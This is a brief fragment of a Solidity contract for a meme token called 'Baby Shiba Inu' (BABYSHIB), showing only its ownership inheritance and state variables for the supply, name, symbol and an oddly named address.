...
contract BABYSHIBTOKEN is Ownable {
    address public caaqwa21;
    uint256 supplyamount = 10000000000*10**decimals();
    uint256 private _cctotalSupply = supplyamount;
    string private _cctokenname = "Baby Shiba Inu";
    string private _cctokensymbol = "BABYSHIB";
